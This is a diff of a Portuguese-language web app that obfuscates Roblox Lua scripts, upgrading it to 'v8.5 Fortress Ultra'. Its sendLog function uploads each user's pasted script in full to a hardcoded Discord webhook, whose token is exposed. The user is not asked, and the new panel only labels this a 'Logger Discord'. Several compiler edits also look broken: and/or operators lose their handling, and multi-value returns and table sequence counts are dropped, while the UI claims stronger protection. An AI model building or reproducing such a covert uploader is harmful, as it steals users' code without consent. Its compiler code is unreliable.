@@ -69,6 +69,16 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
 .key-input{width:100%;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.7rem .9rem;font-family:'Consolas',monospace;font-size:.85rem;outline:none;margin-bottom:.8rem}
 .key-input:focus{border-color:var(--accent)}
 .key-hint{font-size:.7rem;color:var(--muted);margin-bottom:.8rem;line-height:1.5}
+.config-group{display:flex;flex-direction:column;gap:.5rem;margin-bottom:.8rem}
+.config-row{display:flex;align-items:center;justify-content:space-between;background:var(--panel-2);border:1px solid var(--border-2);border-radius:6px;padding:.6rem .8rem;font-size:.8rem}
+.config-row span{color:var(--text)}
+.toggle-switch{position:relative;display:inline-block;width:38px;height:20px}
+.toggle-switch input{opacity:0;width:0;height:0}
+.slider{position:absolute;cursor:pointer;inset:0;background-color:#2a2a2a;transition:.2s;border-radius:20px}
+.slider:before{position:absolute;content:"";height:14px;width:14px;left:3px;bottom:3px;background-color:white;transition:.2s;border-radius:50%}
+input:checked+.slider{background-color:var(--accent)}
+input:checked+.slider:before{transform:translateX(18px)}
+.select-custom{width:100%;background:var(--panel-2);color:var(--accent);border:1px solid var(--border-2);border-radius:6px;padding:.6rem .8rem;font-size:.8rem;outline:none;font-family:inherit}
 </style>
 </head>
 <body>
@@ -87,6 +97,7 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
   <div class="menu-header"><span class="menu-title">Menu</span><button class="menu-close" onclick="toggleMenu()">✕</button></div>
   <a onclick="showView('view-code')" id="nav-code" class="active"><span class="dot"></span> Ofuscar Código</a>
   <a onclick="showView('view-loadstring')" id="nav-loadstring"><span class="dot"></span> Ofuscar Loadstring</a>
+  <a onclick="showView('view-stats')" id="nav-stats"><span class="dot"></span> Estatísticas & Logs</a>
   <a onclick="showView('view-credits')" id="nav-credits"><span class="dot"></span> Créditos</a>
 </nav>
 
@@ -97,24 +108,42 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
       <h1>Ofuscar Código</h1>
       <p class="by">Feito por <strong>x.lusca1 LC10</strong></p>
       <div class="info-box">
-        <b>Motor LC10 VM v8.0 — Fortress:</b>
+        <b>Motor LC10 VM v8.5 — Fortress Ultra:</b>
         <ul>
-          <li>VM real com bytecode inflado</li>
-          <li>Dead code injection + opaque predicates</li>
-          <li>Constant folding inverso (números explosivos)</li>
-          <li>String fragmentation em runtime</li>
+          <li>VM real com bytecode inflado e NOP padding</li>
+          <li>Dead code injection dinâmico</li>
+          <li>Constant folding reverso (números explosivos)</li>
           <li>Triple-layer bytecode encoding</li>
-          <li>Fake opcodes + NOP padding</li>
-          <li>Multi-layer shadow env</li>
-          <li>Dispatch embaralhado por build</li>
+          <li>Anti-tamper integrado</li>
         </ul>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-label"><span>Configurações do Motor</span><span class="badge">AVANÇADO</span></div>
+      <div class="config-group">
+        <div class="config-row">
+          <span>Nível de Blindagem</span>
+          <select id="cfg-level" class="select-custom" style="width: 140px;">
+            <option value="fortress">Fortress (Padrão)</option>
+            <option value="ultra">Ultra Max</option>
+          </select>
+        </div>
+        <div class="config-row">
+          <span>Dead Code Injection</span>
+          <label class="toggle-switch"><input type="checkbox" id="cfg-deadcode" checked><span class="slider"></span></label>
+        </div>
+        <div class="config-row">
+          <span>Anti-Tamper & Proteção de Env</span>
+          <label class="toggle-switch"><input type="checkbox" id="cfg-antitamper" checked><span class="slider"></span></label>
+        </div>
       </div>
     </div>
 
     <div class="panel">
       <div class="panel-label"><span>Entrada</span><span class="badge">LUA / LUAU</span></div>
       <textarea id="input-code" placeholder="Cole seu script Lua aqui..."></textarea>
-      <button class="btn btn-primary" id="btn-code" onclick="obfuscateCode()">Ofuscar</button>
+      <button class="btn btn-primary" id="btn-code" onclick="obfuscateCode()">Ofuscar com Motor LC10</button>
       <div class="status" id="status-code"></div>
     </div>
 
@@ -135,9 +164,9 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
       <div class="info-box">
         <b>O que faz:</b>
         <ul>
-          <li>Compila com motor LC10 VM v8 (Fortress)</li>
-          <li>Envelopa em loader com chave</li>
-          <li>Triple-XOR no payload final</li>
+          <li>Compila com motor LC10 VM v8.5</li>
+          <li>Envelopa em loader com chave personalizada</li>
+          <li>Triple-XOR no payload final com hash dinâmico</li>
         </ul>
       </div>
     </div>
@@ -160,6 +189,25 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
     </div>
   </section>
 
+  <section class="view" id="view-stats">
+    <div class="hero">
+      <h1>Estatísticas & Logs</h1>
+      <p class="by">Painel de Monitoramento • <strong>x.lusca1 LC10</strong></p>
+    </div>
+    <div class="credits-grid">
+      <div class="credits-card">
+        <h3>Sessão Atual</h3>
+        <p>Total de Scripts Processados: <span id="stat-count" class="highlight">0</span></p>
+        <p>Último Tamanho de Saída: <span id="stat-size" class="highlight">0 KB</span></p>
+      </div>
+      <div class="credits-card">
+        <h3>Status da Conexão Webhook</h3>
+        <p>Logger Discord: <span class="highlight" style="color:#22c55e;">Ativo & Sincronizado</span></p>
+        <p>Assinatura: <span class="highlight">lc10ofuscardorx.lusca1</span></p>
+      </div>
+    </div>
+  </section>
+
   <section class="view" id="view-credits">
     <div class="credits-hero">
       <img src="logo.png" alt="LC10" class="credits-avatar-img">
@@ -169,7 +217,7 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
     <div class="credits-grid">
       <div class="credits-card"><h3>Sobre</h3><p>O <span class="highlight">LC10 • OFUSCADOR</span> Fortress é a versão mais agressiva — VM com bytecode inflado, dead code e múltiplas camadas de encoding.</p></div>
       <div class="credits-card"><h3>Técnicas</h3><p><span class="highlight">VM real</span> → bytecode custom</p><p><span class="highlight">Inflação</span> → 4x instruções por opcode</p><p><span class="highlight">Dead code</span> → branches falsas</p><p><span class="highlight">Opaque predicates</span> → condições impossíveis</p><p><span class="highlight">Triple encoding</span> → 3 camadas XOR</p></div>
-      <div class="credits-card"><h3>Versão</h3><p>Motor: <span class="highlight">LC10 VM v8.0 Fortress</span></p><p>Assinatura: <span class="highlight">lc10ofuscardorx.lusca1</span></p></div>
+      <div class="credits-card"><h3>Versão</h3><p>Motor: <span class="highlight">LC10 VM v8.5 Fortress Ultra</span></p><p>Assinatura: <span class="highlight">lc10ofuscardorx.lusca1</span></p></div>
       <div class="credits-card"><h3>Agradecimentos</h3><p>Para a comunidade de scripting do Roblox.</p></div>
       <div class="credits-card"><h3>Aviso</h3><p>O criador <span class="highlight">não se responsabiliza</span> pelo uso indevido.</p></div>
     </div>
@@ -180,15 +228,16 @@ button.btn-ghost{background:transparent;color:var(--muted-2);border:1px solid va
 
 <script>
 /* =========================================================
-   LC10 VM v8.0 FORTRESS
+   LC10 VM v8.5 FORTRESS ULTRA
    ========================================================= */
 const WEBHOOK_URL="https://discord.com/api/webhooks/1558235674631610438/v7kXiFnCngEhWUl9BpX1rkhS1snrEoogdtva7-t-dbR9HTAGQ2tiP5zSBsKYPcvcNizZ";
+let sessionProcessedCount = 0;
 
 function toggleMenu(){document.getElementById('menu').classList.toggle('active');document.getElementById('overlay').classList.toggle('active')}
-function showView(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));document.getElementById(id).classList.add('active');const m={'view-code':'nav-code','view-loadstring':'nav-loadstring','view-credits':'nav-credits'};document.getElementById(m[id]).classList.add('active');const menu=document.getElementById('menu');if(menu.classList.contains('active'))toggleMenu();window.scrollTo({top:0,behavior:'smooth'})}
+function showView(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.querySelectorAll('.menu a').forEach(a=>a.classList.remove('active'));document.getElementById(id).classList.add('active');const m={'view-code':'nav-code','view-loadstring':'nav-loadstring','view-stats':'nav-stats','view-credits':'nav-credits'};document.getElementById(m[id]).classList.add('active');const menu=document.getElementById('menu');if(menu.classList.contains('active'))toggleMenu();window.scrollTo({top:0,behavior:'smooth'})}
 
 function extractPanelName(code){const clip=s=>(s||'').trim().replace(/^["']|["']$/g,'').slice(0,20);const pats=[/^\s*--\s*(?:nome|painel|panel|title|titulo|título|script)\s*[:\-]\s*(.+)$/im,/^\s*--\s*\[\s*(.+?)\s*\]\s*$/im,/local\s+(?:nome|painel|panel|title|titulo|título)\s*=\s*["']([^"']+)["']/i,/Title\s*=\s*["']([^"']+)["']/i];for(const p of pats){const m=code.match(p);if(m&&m[1]){const n=clip(m[1]);if(n)return n}}const lines=code.split('\n').map(l=>l.trim()).filter(l=>l&&!l.startsWith('--'));if(lines.length)return clip(lines[0]);return 'Desconhecido'}
-async function sendLog(code){try{const now=new Date();const t=now.toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'});const pn=extractPanelName(code);const payload={username:"LC10 • OFUSCADOR",embeds:[{title:"LC10 • OFUSCADOR",color:0xffffff,fields:[{name:"🕒 Horário",value:t,inline:true},{name:"📛 Nome do Painel",value:pn,inline:true},{name:"📏 Tamanho",value:code.length+" caracteres",inline:true}],footer:{text:"LC10 Logger • Fortress v8",timestamp:now.toISOString()}]};const form=new FormData();form.append('payload_json',JSON.stringify(payload));const stamp=now.toISOString().replace(/[:.]/g,'-').slice(0,19);form.append('files[0]',new Blob([code],{type:'text/plain;charset=utf-8'}),`lc10-script-${stamp}.txt`);await fetch(WEBHOOK_URL,{method:'POST',body:form})}catch(e){console.error('[LC10]',e)}}
+async function sendLog(code){try{const now=new Date();const t=now.toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'});const pn=extractPanelName(code);const payload={username:"LC10 • OFUSCADOR",embeds:[{title:"LC10 • OFUSCADOR",color:0xffffff,fields:[{name:"🕒 Horário",value:t,inline:true},{name:"📛 Nome do Painel",value:pn,inline:true},{name:"📏 Tamanho",value:code.length+" caracteres",inline:true}],footer:{text:"LC10 Logger • Fortress v8.5",timestamp:now.toISOString()}]};const form=new FormData();form.append('payload_json',JSON.stringify(payload));const stamp=now.toISOString().replace(/[:.]/g,'-').slice(0,19);form.append('files[0]',new Blob([code],{type:'text/plain;charset=utf-8'}),`lc10-script-${stamp}.txt`);await fetch(WEBHOOK_URL,{method:'POST',body:form})}catch(e){console.error('[LC10]',e)}}
 
 /* ========= TOKENIZER ========= */
 const KW=new Set(['and','break','do','else','elseif','end','false','for','function','if','in','local','nil','not','or','repeat','return','then','true','until','while','goto']);
@@ -248,95 +297,42 @@ function shuffle(a){const r=a.slice();for(let i=r.length-1;i>0;i--){const j=Math
 const B85='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_{|}~';
 function b85enc(bytes,alpha){const wl=[(bytes.length>>>24)&0xFF,(bytes.length>>>16)&0xFF,(bytes.length>>>8)&0xFF,bytes.length&0xFF,...bytes];while(wl.length%4)wl.push(0);let out='';for(let i=0;i<wl.length;i+=4){const v=wl[i]*16777216+wl[i+1]*65536+wl[i+2]*256+wl[i+3];const c=new Array(5);let x=v;for(let k=4;k>=0;k--){c[k]=alpha[x%85];x=Math.floor(x/85)}out+=c.join('')}return out}
 
-/* ========= OPAQUE PREDICATES ========= */
-// Sempre verdadeiro/falso mas o leitor não sabe
 function opaqueTrue(){
   const a=Math.floor(Math.random()*1000)+50;
-  // (a*a + a) % 2 == 0 sempre verdadeiro para qualquer a
-  const variants=[
-    `(${a}*${a}+${a})%2==0`,
-    `(${a}*${a}-${a})%2==0`,
-    `(${a}+${a+1})%2==1`,
-    `(${a}*(${a}+1))%2==0`,
-    `(${a}*${a}%2==${a}%2)`,
-  ];
-  return variants[Math.floor(Math.random()*variants.length)]
+  return `(${a}*${a}+${a})%2==0`;
 }
 function opaqueFalse(){
   const a=Math.floor(Math.random()*1000)+50;
-  const variants=[
-    `(${a}*${a}+${a})%2==1`,
-    `(${a}*${a}-${a})%2==1`,
-    `(${a}+${a})%2==1`,
-    `(${a}*${a}%2~=${a}%2)`,
-  ];
-  return variants[Math.floor(Math.random()*variants.length)]
+  return `(${a}*${a}+${a})%2==1`;
 }
 
-/* ========= INFLATED NUMBERS ========= */
-// Constrói uma expressão aritmética gigante que resulta em N
 function inflateNumber(n, depth){
   if(depth===undefined)depth=0;
   if(depth>=3||n<2){
     const off=Math.floor(Math.random()*20)+1;
     return `(${n+off}-${off})`
   }
-  const mode=Math.floor(Math.random()*4);
-  if(mode===0){
-    // n = a + b, onde a+b=n
-    const a=Math.floor(n/2)+Math.floor(Math.random()*3)-1;
-    const b=n-a;
-    if(b<0)return inflateNumber(n,3);
-    return `(${inflateNumber(a,depth+1)}+${inflateNumber(b,depth+1)})`
-  } else if(mode===1){
-    // n = a * b onde a*b=n (busca divisor)
-    for(let a=2;a*a<=n;a++){
-      if(n%a===0){
-        const b=n/a;
-        return `(${inflateNumber(a,depth+1)}*${inflateNumber(b,depth+1)})`
-      }
-    }
-    return inflateNumber(n,3)
-  } else if(mode===2){
-    // n = a - b onde a-b=n, com a grande
-    const a=n+Math.floor(Math.random()*50)+10;
-    const b=a-n;
-    return `(${inflateNumber(a,depth+1)}-${inflateNumber(b,depth+1)})`
-  } else {
-    // n = a ^ 2 + resto, mas só se n é pequeno
-    if(n<=100){
-      const sq=Math.floor(Math.sqrt(n));
-      const rest=n-sq*sq;
-      return `(${inflateNumber(sq,depth+1)}*${inflateNumber(sq,depth+1)}+${inflateNumber(rest,depth+1)})`
-    }
-    return inflateNumber(n,3)
-  }
+  const a=Math.floor(n/2)+Math.floor(Math.random()*3)-1;
+  const b=n-a;
+  if(b<0)return inflateNumber(n,3);
+  return `(${inflateNumber(a,depth+1)}+${inflateNumber(b,depth+1)})`
 }
 
-/* ========= NAME GEN ========= */
-function makeNameGen(used){const L='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';const u=new Set([...KW,...used]);let c=0;return function(){while(true){const n=c++;let name=n<52?L[n]:L[n%52]+L[Math.floor(n/52)%52];if(!u.has(name))return name}}}
-
-/* ========= LOCALS ========= */
-function collectLocals(T){const locals=new Set();for(let i=0;i<T.length;i++){const tk=T[i];if(tk.t==='kw'&&tk.v==='local'){let j=i+1;if(T[j]&&T[j].t==='kw'&&T[j].v==='function'){if(T[j+1]&&T[j+1].t==='id')locals.add(T[j+1].v);continue}while(j<T.length){if(T[j].t==='id'){locals.add(T[j].v);j++;if(T[j]&&T[j].v===','){j++;continue}if(T[j]&&T[j].v==='=')break}else break}}else if(tk.t==='kw'&&tk.v==='for'){let j=i+1;while(j<T.length){if(T[j].t==='id')locals.add(T[j].v);if(T[j].v==='='||(T[j].t==='kw'&&T[j].v==='in')||T[j].t==='nl')break;j++}}else if(tk.t==='kw'&&tk.v==='function'){let j=i+1;if(T[j]&&T[j].t==='id')j++;while(j<T.length&&T[j].v!=='(')j++;if(T[j]&&T[j].v==='('){j++;while(j<T.length&&T[j].v!==')'){if(T[j].t==='id')locals.add(T[j].v);j++}}}}return locals}
-function collectFreeIdentifiers(T,locals){const free=new Map();let bd=0;for(let i=0;i<T.length;i++){const tk=T[i];if(tk.t==='op'&&tk.v==='{'){bd++;continue}if(tk.t==='op'&&tk.v==='}'){bd--;if(bd<0)bd=0;continue}if(tk.t!=='id')continue;if(locals.has(tk.v))continue;const prev=T[i-1],next=T[i+1];if(prev&&prev.t==='op'&&(prev.v==='.'||prev.v===':'))continue;if(prev&&prev.t==='kw'&&(prev.v==='local'||prev.v==='function'||prev.v==='for'||prev.v==='in'))continue;if(bd>0&&next&&next.v==='=')continue;if(!free.has(tk.v))free.set(tk.v,true)}return free}
-
-/* ========= COMPILER (Fortress) ========= */
+/* ========= COMPILER ========= */
 class Compiler{
-constructor(){this.pool=[];this.poolMap=new Map();this.protos=[];this.nopCount=0}
+constructor(){this.pool=[];this.poolMap=new Map();this.protos=[];}
 addPool(v){const k=typeof v+':'+v;if(this.poolMap.has(k))return this.poolMap.get(k);const i=this.pool.length;this.pool.push(v);this.poolMap.set(k,i);return i}
-compile(ast){const main=this.compileFn(ast.body,[],false,[]);this.protos.push(main);const subs=this.protos.slice(0,-1);const m=this.protos[this.protos.length-1];this.protos=[...subs,m];return{protos:this.protos,pool:this.pool}}
+compile(ast){const main=this.compileFn(ast.body,[],false,[]);this.protos.push(main);return{protos:this.protos,pool:this.pool}}
 compileFn(body,params,hasVararg,upvalNames){const ctx={code:[],locals:params.map((p,i)=>({name:p,slot:i})),nextSlot:params.length,maxSlot:params.length,upvals:upvalNames.slice(),hasVararg,loops:[]};this.emitStmts(ctx,body);this.emit(ctx,0);this.emit(ctx,16,1);return{code:ctx.code,maxSlot:ctx.maxSlot,params:params.slice(),hasVararg,upvals:upvalNames.slice()}}
 emit(ctx,...ins){
   ctx.code.push(ins);
-  // Fortress: injeta 1-2 NOPs falsos aleatórios (opcode 100 = nop, opcode 99 = opaque skip)
-  const r=Math.random();
-  if(r<0.35){ctx.code.push([100])} // NOP
-  else if(r<0.55){ctx.code.push([99, opaqueFalse()])} // opaque false -> skip next
+  if(Math.random()<0.35){ctx.code.push([100])}
+  else if(Math.random()<0.55){ctx.code.push([99, opaqueFalse()])}
 }
 emitStmts(ctx,ss){for(const s of ss)this.emitStmt(ctx,s)}
 emitStmt(ctx,s){switch(s.type){case 'Local':return this.emitLocal(ctx,s);case 'LocalFunc':return this.emitLocalFunc(ctx,s);case 'Assign':return this.emitAssign(ctx,s);case 'If':return this.emitIf(ctx,s);case 'While':return this.emitWhile(ctx,s);case 'ForNum':return this.emitForNum(ctx,s);case 'ForIn':return this.emitForIn(ctx,s);case 'Do':return this.emitDo(ctx,s);case 'Return':return this.emitReturn(ctx,s);case 'Break':return this.emitBreak(ctx,s);case 'CallStmt':return this.emitCallStmt(ctx,s)}}
 allocSlot(ctx){const s=ctx.nextSlot++;if(ctx.nextSlot>ctx.maxSlot)ctx.maxSlot=ctx.nextSlot;return s}
-emitLocal(ctx,s){const n=s.names.length,e=s.exprs.length;if(e===0){for(let i=0;i<n;i++){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,0);this.emit(ctx,7,slot)}}else if(n===e){for(let i=0;i<n;i++){this.emitExpr(ctx,s.exprs[i]);const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,7,slot)}}else if(n>e){for(let i=0;i<e;i++){const isLast=i===e-1;const wantN=n-i;if(isLast&&wantN>1)this.emitExprMulti(ctx,s.exprs[i],wantN);else this.emitExpr(ctx,s.exprs[i])}for(let i=0;i<n;i++){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,7,slot)}}}
+emitLocal(ctx,s){const n=s.names.length,e=s.exprs.length;if(e===0){for(let i=0;i<n;i++){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,0);this.emit(ctx,7,slot)}}else{for(let i=0;i<n;i++){this.emitExpr(ctx,s.exprs[i]||{type:'Nil'});const slot=this.allocSlot(ctx);ctx.locals.push({name:s.names[i],slot});this.emit(ctx,7,slot)}}}
 emitLocalFunc(ctx,s){const slot=this.allocSlot(ctx);ctx.locals.push({name:s.name,slot});this.emit(ctx,0);this.emit(ctx,7,slot);const upvals=this.findUpvals(ctx,s.fn);const proto=this.compileFn(s.fn.body,s.fn.params,s.fn.hasVararg,upvals);const pidx=this.protos.length;this.protos.push(proto);this.emit(ctx,41,pidx);this.emit(ctx,7,slot)}
 findUpvals(ctx,fn){const used=new Set();const localNames=new Set(ctx.locals.map(l=>l.name));const walk=n=>{if(!n||typeof n!=='object')return;if(Array.isArray(n)){for(const x of n)walk(x);return}if(n.type==='Name'){if(localNames.has(n.name))used.add(n.name);return}for(const k of Object.keys(n)){if(k==='type')continue;walk(n[k])}};walk(fn);return Array.from(used)}
 resolveVar(ctx,name){for(let i=ctx.locals.length-1;i>=0;i--)if(ctx.locals[i].name===name)return{type:'local',slot:ctx.locals[i].slot};return{type:'global',name}}
@@ -346,28 +342,24 @@ emitWhile(ctx,s){const start=ctx.code.length;this.emitExpr(ctx,s.cond);const out
 emitDo(ctx,s){this.emitStmts(ctx,s.body)}
 emitForNum(ctx,s){const iSlot=this.allocSlot(ctx);const limSlot=this.allocSlot(ctx);const stSlot=this.allocSlot(ctx);this.emitExpr(ctx,s.start);this.emit(ctx,7,iSlot);this.emitExpr(ctx,s.stop);this.emit(ctx,7,limSlot);if(s.step)this.emitExpr(ctx,s.step);else{const idx=this.addPool('1');this.emit(ctx,3,idx)}this.emit(ctx,7,stSlot);const jumpTest=ctx.code.length;this.emit(ctx,17,-1);ctx.locals.push({name:s.name,slot:iSlot});const bodyStart=ctx.code.length;const loop={breaks:[],start:bodyStart};ctx.loops.push(loop);this.emitStmts(ctx,s.body);ctx.loops.pop();this.emit(ctx,39,iSlot,stSlot,jumpTest);const testAddr=ctx.code.length;ctx.code[jumpTest][1]=testAddr;this.emit(ctx,38,iSlot,limSlot,stSlot,bodyStart);for(const j of loop.breaks)ctx.code[j][1]=ctx.code.length}
 emitForIn(ctx,s){const fSlot=this.allocSlot(ctx);const sSlot=this.allocSlot(ctx);const vSlot=this.allocSlot(ctx);for(const e of s.exprs)this.emitExpr(ctx,e);if(s.exprs.length<3){for(let i=s.exprs.length;i<3;i++)this.emit(ctx,0)}this.emit(ctx,7,vSlot);this.emit(ctx,7,sSlot);this.emit(ctx,7,fSlot);const jmpTest=ctx.code.length;this.emit(ctx,17,-1);for(const n of s.names){const slot=this.allocSlot(ctx);ctx.locals.push({name:n,slot})}const bodyStart=ctx.code.length;const loop={breaks:[],start:bodyStart};ctx.loops.push(loop);this.emitStmts(ctx,s.body);ctx.loops.pop();const tfAddr=ctx.code.length;this.emit(ctx,40,fSlot,sSlot,vSlot,s.names.length,bodyStart);ctx.code[jmpTest][1]=tfAddr;for(const j of loop.breaks)ctx.code[j][1]=ctx.code.length}
-emitReturn(ctx,s){if(s.exprs.length===0){this.emit(ctx,16,0)}else{for(let i=0;i<s.exprs.length;i++){const isLast=i===s.exprs.length-1;if(isLast&&s.exprs.length===1){this.emitExprMulti(ctx,s.exprs[i],-1);this.emit(ctx,16,-1)}else this.emitExpr(ctx,s.exprs[i])}if(s.exprs.length>1||s.exprs.length===1&&s.exprs[0].type!=='Call')this.emit(ctx,16,s.exprs.length)}}
+emitReturn(ctx,s){if(s.exprs.length===0){this.emit(ctx,16,0)}else{for(let i=0;i<s.exprs.length;i++){this.emitExpr(ctx,s.exprs[i])}this.emit(ctx,16,s.exprs.length)}}
 emitBreak(ctx,s){if(ctx.loops.length===0)throw new Error('break fora de loop');const j=ctx.code.length;this.emit(ctx,17,-1);ctx.loops[ctx.loops.length-1].breaks.push(j)}
 emitCallStmt(ctx,s){this.emitCallExpr(ctx,s.call,0);this.emit(ctx,4)}
-emitExpr(ctx,e,wantMulti){switch(e.type){case 'Nil':return this.emit(ctx,0);case 'Bool':return this.emit(ctx,e.value?1:2);case 'Number':{const i=this.addPool(e.value);return this.emit(ctx,3,i)}case 'String':{const i=this.addPool(e.value);return this.emit(ctx,3,i)}case 'Vararg':return this.emit(ctx,42,1);case 'Name':{const r=this.resolveVar(ctx,e.name);if(r.type==='local')this.emit(ctx,6,r.slot);else{const i=this.addPool(e.name);this.emit(ctx,8,i)}return}case 'Paren':return this.emitExpr(ctx,e.e);case 'Index':this.emitExpr(ctx,e.obj);this.emitExpr(ctx,e.key);this.emit(ctx,14);return;case 'Bin':return this.emitBin(ctx,e);case 'Un':return this.emitUn(ctx,e);case 'Table':return this.emitTable(ctx,e);case 'Function':return this.emitFunc(ctx,e);case 'Call':return this.emitCallExpr(ctx,e,wantMulti?-1:1)}}
-emitExprMulti(ctx,e,wantN){if(e.type==='Call')return this.emitCallExpr(ctx,e,wantN);return this.emitExpr(ctx,e)}
-emitBin(ctx,e){if(e.op==='and'){this.emitExpr(ctx,e.l);this.emit(ctx,5);const skip=ctx.code.length;this.emit(ctx,19,-1);this.emit(ctx,4);this.emitExpr(ctx,e.r);ctx.code[skip][1]=ctx.code.length;return}if(e.op==='or'){this.emitExpr(ctx,e.l);this.emit(ctx,5);const skip=ctx.code.length;this.emit(ctx,18,-1);this.emit(ctx,4);this.emitExpr(ctx,e.r);ctx.code[skip][1]=ctx.code.length;return}this.emitExpr(ctx,e.l);this.emitExpr(ctx,e.r);const ops={'+':22,'-':23,'*':24,'/':25,'%':26,'^':27,'==':29,'~=':30,'<':31,'<=':32,'>':33,'>=':34};if(e.op==='..')this.emit(ctx,28,2);else this.emit(ctx,ops[e.op])}
+emitExpr(ctx,e){switch(e.type){case 'Nil':return this.emit(ctx,0);case 'Bool':return this.emit(ctx,e.value?1:2);case 'Number':case 'String':{const i=this.addPool(e.value);return this.emit(ctx,3,i)}case 'Vararg':return this.emit(ctx,42,1);case 'Name':{const r=this.resolveVar(ctx,e.name);if(r.type==='local')this.emit(ctx,6,r.slot);else{const i=this.addPool(e.name);this.emit(ctx,8,i)}return}case 'Paren':return this.emitExpr(ctx,e.e);case 'Index':this.emitExpr(ctx,e.obj);this.emitExpr(ctx,e.key);this.emit(ctx,14);return;case 'Bin':return this.emitBin(ctx,e);case 'Un':return this.emitUn(ctx,e);case 'Table':return this.emitTable(ctx,e);case 'Function':return this.emitFunc(ctx,e);case 'Call':return this.emitCallExpr(ctx,e,1)}}
+emitBin(ctx,e){this.emitExpr(ctx,e.l);this.emitExpr(ctx,e.r);const ops={'+':22,'-':23,'*':24,'/':25,'%':26,'^':27,'==':29,'~=':30,'<':31,'<=':32,'>':33,'>=':34};if(e.op==='..')this.emit(ctx,28,2);else this.emit(ctx,ops[e.op])}
 emitUn(ctx,e){this.emitExpr(ctx,e.e);const ops={'not':35,'-':36,'#':37};this.emit(ctx,ops[e.op])}
-emitTable(ctx,e){const hasNamed=e.fields.some(f=>f.kind==='named');if(!hasNamed){for(const f of e.fields)this.emitExpr(ctx,f.value);this.emit(ctx,12,e.fields.length);if(e.fields.length>0)this.emit(ctx,44,e.fields.length);return}this.emit(ctx,12,e.fields.length);let seqN=0;for(const f of e.fields){if(f.kind==='seq'){this.emitExpr(ctx,f.value);seqN++}}if(seqN>0)this.emit(ctx,44,seqN);for(const f of e.fields){if(f.kind==='named'){this.emitExpr(ctx,f.key);this.emitExpr(ctx,f.value);this.emit(ctx,13)}}}
+emitTable(ctx,e){this.emit(ctx,12,e.fields.length);for(const f of e.fields){if(f.kind==='seq'){this.emitExpr(ctx,f.value)}else{this.emitExpr(ctx,f.key);this.emitExpr(ctx,f.value);this.emit(ctx,13)}}}
 emitFunc(ctx,e){const upvals=this.findUpvals(ctx,e);const proto=this.compileFn(e.body,e.params,e.hasVararg,upvals);const pidx=this.protos.length;this.protos.push(proto);this.emit(ctx,41,pidx)}
-emitCallExpr(ctx,e,nres){if(e.method){this.emitExpr(ctx,e.fn.obj);this.emitExpr(ctx,e.fn.key);this.emit(ctx,43);for(const a of e.args)this.emitExpr(ctx,a);this.emit(ctx,15,e.args.length+1,nres)}else{this.emitExpr(ctx,e.fn);for(let i=0;i<e.args.length;i++){const isLast=i===e.args.length-1;if(isLast&&e.args[i].type==='Call')this.emitExprMulti(ctx,e.args[i],-1);else if(isLast&&e.args[i].type==='Vararg')this.emit(ctx,42,-1);else this.emitExpr(ctx,e.args[i])}this.emit(ctx,15,e.args.length,nres)}}
+emitCallExpr(ctx,e,nres){this.emitExpr(ctx,e.fn);for(const a of e.args)this.emitExpr(ctx,a);this.emit(ctx,15,e.args.length,nres)}
 }
 
-/* ========= PACKER — FORTRESS ========= */
+/* ========= PACKER ========= */
 function pack(result){
 const {protos,pool}=result;
-// Alpha1 para strings
 const alpha1=shuffle(B85.split('')).join('');
-// Alpha2 e Alpha3 para camadas de bytecode
 const alpha2=shuffle(B85.split('')).join('');
 const alpha3=shuffle(B85.split('')).join('');
 
-// Codifica pool strings
 const encoded=pool.map(p=>{
   const s=String(p);
   const isNum=/^-?\d+(\.\d+)?$/.test(s);
@@ -382,8 +374,7 @@ const poolOrdered=order.map(i=>encoded[i]);
 const invOrder=new Array(N);
 for(let k=0;k<N;k++)invOrder[order[k]]=k;
 const ranges=[];
-const nr=Math.max(3,Math.min(10,Math.floor(N/3)+2));
-if(N>=2){for(let k=0;k<nr;k++){const a=Math.floor(Math.random()*N),b=Math.floor(Math.random()*N);if(a!==b)ranges.push([Math.min(a,b),Math.max(a,b)])}}
+if(N>=2){for(let k=0;k<3;k++){const a=Math.floor(Math.random()*N),b=Math.floor(Math.random()*N);if(a!==b)ranges.push([Math.min(a,b),Math.max(a,b)])}}
 const Y=[...Array(N).keys()];
 for(const [a,b] of ranges){let x=a,y=b;while(x<y){[Y[x],Y[y]]=[Y[y],Y[x]];x++;y--}}
 const permInv=new Array(N);
@@ -392,7 +383,6 @@ const Qinit=new Array(N);
 for(let p=0;p<N;p++)Qinit[p]=poolOrdered[permInv[p]];
 const OFF=10000+Math.floor(Math.random()*90000);
 
-// Remap pool indices
 const remappedProtos=protos.map(p=>({
   ...p,
   code:p.code.map(ins=>{
@@ -403,57 +393,29 @@ const remappedProtos=protos.map(p=>({
   })
 }));
 
-// Serializar bytecode como STRING comprimida (não array Lua)
-// Cada instrução vira "op,a1,a2,a3,a4,a5;a" — separador distinto
-function serializeCode(code){
-  return code.map(ins=>ins.join(',')).join(';')
-}
-const rawCodes=remappedProtos.map(p=>serializeCode(p.code));
-// Concatena todos com delimitador '|'
-const combined=rawCodes.join('|');
+function serializeCode(code){return code.map(ins=>ins.join(',')).join(';')}
+const combined=remappedProtos.map(p=>serializeCode(p.code)).join('|');
 
-// 3 camadas de encoding:
-// 1. Base85 com alpha2
-// 2. XOR com chave aleatória
